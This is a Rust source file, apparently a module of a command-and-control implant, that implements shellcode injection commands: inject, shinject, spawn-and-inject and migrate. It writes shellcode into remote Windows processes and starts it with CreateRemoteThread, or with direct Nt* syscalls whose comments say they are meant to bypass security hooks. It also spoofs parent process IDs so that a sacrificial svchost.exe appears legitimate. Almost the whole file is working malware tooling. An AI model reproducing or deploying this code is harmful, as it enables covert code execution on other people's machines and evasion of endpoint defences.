//! Process injection — inject, shinject, spawn+inject.
//!
//! All Win32 calls are behind `#[cfg(target_os = "windows")]`.
//! Non-Windows builds get stubs that return an error string.
//!
//! When `use_syscalls` is true, injection uses direct Nt* syscalls
//! (resolved from ntdll) instead of Win32 API calls, bypassing hooks.
//! PPID spoofing is available for spawn+inject operations.

/// Default spawnto process when none is configured.
pub const DEFAULT_SPAWN_PROCESS: &str = r"C:\Windows\System32\svchost.exe";

// ─── Windows implementation ───────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use super::DEFAULT_SPAWN_PROCESS;
    use crate::evasion::ppid;
    use crate::evasion::syscall::{self, nt_success, SyscallTable};
    use anyhow::Result;
    // use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE};
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, HANDLE};
    use windows_sys::core::BOOL;
    use windows_sys::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, CreateRemoteThread, OpenProcess, ResumeThread, PROCESS_ALL_ACCESS,
        PROCESS_INFORMATION, STARTUPINFOW, CREATE_SUSPENDED,
    };
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    // unsafe extern "system" {
    //     fn WriteProcessMemory(
    //         hProcess: HANDLE,
    //         lpBaseAddress: *mut core::ffi::c_void,
    //         lpBuffer: *const core::ffi::c_void,
    //         nSize: usize,
    //         lpNumberOfBytesWritten: *mut usize,
    //     ) -> BOOL;
    // }

    // ─── Win32 API injection (original path) ────────────────────────────

    /// Core injection routine via Win32 API: allocate RW → write → flip to RX → CreateRemoteThread.
    unsafe fn inject_into_process_win32(
        process: HANDLE,
        shellcode: &[u8],
    ) -> (i32, String, String) {
        let base = VirtualAllocEx(
            process,
            core::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            return (
                1,
                String::new(),
                format!("VirtualAllocEx failed: error {}", GetLastError()),
            );
        }

        let mut written: usize = 0;
        // if WriteProcessMemory(
        //     process,
        //     base,
        //     shellcode.as_ptr().cast(),
        //     shellcode.len(),
        //     &mut written,
        // ) == FALSE
        use core::ffi::c_void;
        if WriteProcessMemory(
            process as *mut c_void,
            base,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut written,
        ) == FALSE
        {
            return (
                1,
                String::new(),
                format!("WriteProcessMemory failed: error {}", GetLastError()),
            );
        }

        let mut old_protect: u32 = 0;
        if VirtualProtectEx(
            process,
            base,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == FALSE
        {
            return (
                1,
                String::new(),
                format!("VirtualProtectEx failed: error {}", GetLastError()),
            );
        }

        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            Some(core::mem::transmute(base)),
            core::ptr::null(),
            0,
            core::ptr::null_mut(),
        );
        if thread.is_null() {
            return (
                1,
                String::new(),
                format!("CreateRemoteThread failed: error {}", GetLastError()),
            );
        }
        CloseHandle(thread);

        (
            0,
            format!(
                "[*] Injected {} bytes at {:p}, thread started",
                shellcode.len(),
                base
            ),
            String::new(),
        )
    }

    // ─── Direct syscall injection path ──────────────────────────────────

    /// Core injection routine via direct syscalls (Nt* functions).
    unsafe fn inject_into_process_syscall(
        table: &SyscallTable,
        process: HANDLE,
        shellcode: &[u8],
    ) -> (i32, String, String) {
        // NtAllocateVirtualMemory — RW
        let mut base: *mut u8 = core::ptr::null_mut();
        let mut size = shellcode.len();
        let status = syscall::nt_allocate_virtual_memory(
            table,
            process,
            &mut base,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if !nt_success(status) {
            return (
                1,
                String::new(),
                format!("NtAllocateVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32),
            );
        }

        // NtWriteVirtualMemory
        let status = syscall::nt_write_virtual_memory(table, process, base, shellcode);
        if !nt_success(status) {
            return (
                1,
                String::new(),
                format!("NtWriteVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32),
            );
        }

        // NtProtectVirtualMemory — W^X flip to RX
        let mut protect_base = base;
        let mut protect_size = shellcode.len();
        let mut old_protect: u32 = 0;
        let status = syscall::nt_protect_virtual_memory(
            table,
            process,
            &mut protect_base,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
        if !nt_success(status) {
            return (
                1,
                String::new(),
                format!("NtProtectVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32),
            );
        }

        // NtCreateThreadEx — execute
        match syscall::nt_create_thread_ex(table, process, base) {
            Ok(thread) => {
                CloseHandle(thread);
                (
                    0,
                    format!(
                        "[*] Injected {} bytes at {:p} via syscall, thread started",
                        shellcode.len(),
                        base
                    ),
                    String::new(),
                )
            }
            Err(e) => (1, String::new(), format!("{}", e)),
        }
    }

    /// Dispatch to either Win32 or syscall injection path.
    unsafe fn inject_into_process(
        process: HANDLE,
        shellcode: &[u8],
        use_syscalls: bool,
    ) -> (i32, String, String) {
        if use_syscalls {
            match SyscallTable::resolve() {
                Ok(table) => inject_into_process_syscall(&table, process, shellcode),
                Err(e) => (
                    1,
                    String::new(),
                    format!("syscall table resolve failed: {}", e),
                ),
            }
        } else {
            inject_into_process_win32(process, shellcode)
        }
    }

    /// inject <pid> <shellcode>: inject into an existing process.
    pub fn inject(pid: u32, shellcode: &[u8], use_syscalls: bool) -> Result<(i32, String, String)> {
        unsafe {
            let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if process.is_null() {
                return Ok((
                    1,
                    String::new(),
                    format!("OpenProcess({}) failed: error {}", pid, GetLastError()),
                ));
            }

            let result = inject_into_process(process, shellcode, use_syscalls);
            CloseHandle(process);
            Ok(result)
        }
    }

    /// shinject <pid> <path>: read shellcode from file then inject.
    pub fn shinject(pid: u32, shellcode_path: &str, use_syscalls: bool) -> Result<(i32, String, String)> {
        let shellcode = match std::fs::read(shellcode_path) {
            Ok(data) => data,
            Err(e) => {
                return Ok((
                    1,
                    String::new(),
                    format!("failed to read '{}': {}", shellcode_path, e),
                ))
            }
        };
        if shellcode.is_empty() {
            return Ok((1, String::new(), "shellcode file is empty".to_string()));
        }
        inject(pid, &shellcode, use_syscalls)
    }

    /// spawn+inject: create suspended process, inject, resume.
    ///
    /// When `ppid_spoof` is `Some(parent_name)`, the sacrificial process is
    /// created with PPID spoofing (parent set to the given process name,
    /// e.g. "explorer.exe").
    pub fn spawn_inject(
        shellcode: &[u8],
        spawn_exe: Option<&str>,
        config_spawn: Option<&str>,
        use_syscalls: bool,
        ppid_spoof: Option<&str>,
    ) -> Result<(i32, String, String)> {
        let exe = spawn_exe
            .or(config_spawn)
            .unwrap_or(DEFAULT_SPAWN_PROCESS);

        // Choose between PPID-spoofed and normal process creation.
        if let Some(parent_name) = ppid_spoof {
            return spawn_inject_spoofed(shellcode, exe, parent_name, use_syscalls);
        }

        let exe_w: Vec<u16> = exe.encode_utf16().chain(core::iter::once(0)).collect();

        unsafe {
            let mut si: STARTUPINFOW = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            if CreateProcessW(
                exe_w.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_SUSPENDED,
                core::ptr::null(),
                core::ptr::null(),
                &si,
                &mut pi,
            ) == FALSE
            {
                return Ok((
                    1,
                    String::new(),
                    format!(
                        "CreateProcessW('{}') failed: error {}",
                        exe,
                        GetLastError()
                    ),
                ));
            }

            let result = inject_into_process(pi.hProcess, shellcode, use_syscalls);

            if result.0 != 0 {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Ok(result);
            }

            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Ok((
                0,
                format!(
                    "[*] Spawned '{}' (PID {}), injected {} bytes",
                    exe, pi.dwProcessId, shellcode.len()
                ),
                String::new(),
            ))
        }
    }

    /// spawn+inject with PPID spoofing.
    fn spawn_inject_spoofed(
        shellcode: &[u8],
        exe: &str,
        parent_name: &str,
        use_syscalls: bool,
    ) -> Result<(i32, String, String)> {
        // Resolve parent PID from process name.
        let parent_pid = ppid::find_process_by_name(parent_name)?;

        // Create suspended process with spoofed parent.
        let (process, thread, pid) = ppid::create_process_spoofed(exe, parent_pid)?;

        unsafe {
            let result = inject_into_process(process, shellcode, use_syscalls);

            if result.0 != 0 {
                CloseHandle(thread);
                CloseHandle(process);
                return Ok(result);
            }

            ResumeThread(thread);
            CloseHandle(thread);
            CloseHandle(process);

            Ok((
                0,
                format!(
                    "[*] Spawned '{}' (PID {}, PPID spoofed via '{}' PID {}), injected {} bytes",
                    exe, pid, parent_name, parent_pid, shellcode.len()
                ),
                String::new(),
            ))
        }
    }
}

// ─── Windows: migrate (inject + ExitProcess) ─────────────────────────

#[cfg(target_os = "windows")]
pub fn migrate(pid: u32, shellcode: &[u8], use_syscalls: bool) -> anyhow::Result<(i32, String, String)> {
    let result = win::inject(pid, shellcode, use_syscalls)?;
    if result.0 != 0 {
        return Ok(result);
    }
    unsafe {
        windows_sys::Win32::System::Threading::ExitProcess(0);
    }
    unreachable!()
}

#[cfg(not(target_os = "windows"))]
pub fn migrate(_pid: u32, _shellcode: &[u8], _use_syscalls: bool) -> anyhow::Result<(i32, String, String)> {
    Ok((1, String::new(), "migrate requires Windows".to_string()))
}

// ─── Non-Windows stubs ────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    use anyhow::Result;

    pub fn inject(_pid: u32, _shellcode: &[u8], _use_syscalls: bool) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "inject requires Windows".to_string()))
    }

    pub fn shinject(_pid: u32, _shellcode_path: &str, _use_syscalls: bool) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "shinject requires Windows".to_string()))
    }

    pub fn spawn_inject(
        _shellcode: &[u8],
        _spawn_exe: Option<&str>,
        _config_spawn: Option<&str>,
        _use_syscalls: bool,
        _ppid_spoof: Option<&str>,
    ) -> Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "spawn_inject requires Windows".to_string(),
        ))
    }
}

#[cfg(target_os = "windows")]
pub use win::{inject, shinject, spawn_inject};

#[cfg(not(target_os = "windows"))]
pub use stub::{inject, shinject, spawn_inject};
